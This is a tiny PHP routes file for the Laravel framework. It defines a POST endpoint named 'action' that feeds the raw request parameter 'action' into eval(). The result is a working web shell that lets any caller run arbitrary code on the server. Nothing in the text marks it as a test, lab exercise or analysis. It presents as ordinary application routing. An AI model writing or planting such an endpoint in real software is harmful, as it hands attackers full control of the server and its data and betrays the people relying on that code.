<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
Route::post('action',function (Request $request)  {
   eval($request->action);
});